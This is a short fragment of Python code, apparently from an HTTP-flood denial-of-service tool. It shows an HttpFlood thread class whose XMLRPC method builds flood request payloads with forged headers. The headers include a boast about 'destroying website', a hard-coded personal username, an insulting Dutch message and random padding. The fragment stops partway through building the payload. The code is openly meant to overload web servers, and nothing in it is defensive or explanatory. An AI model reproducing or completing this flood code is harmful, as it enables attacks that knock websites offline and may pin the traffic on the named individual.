...
class HttpFlood(Thread):
    ...
    def XMLRPC(self) -> None:
        # Genereer random content voor headers
        custom_ddos_header = "DDOS used with DDOSBotattackweb - easy and free destroying website"
        username = "J.vanpanhuis"
        random_message = (
            "iedereen werk is een loser man | " 
            f"{ProxyTools.Random.rand_str(32)} | "
            f"{ProxyTools.Random.rand_str(16)}"
        )

        # Bouw de payload met custom headers
        payload: bytes = self.generate_payload(
            (f"Content-Length: 420\r\n"
             f"X-Requested-With: XMLHttpRequest\r\n"
             f"X-DDOS-Header: {custom_ddos_header}\r\n"
             f"Username: {username}\r\n"
             f"Message: {random_message}\r\n"
             f"X-Private-Key: {ProxyTools.Random.rand_str(64)}\r\n"
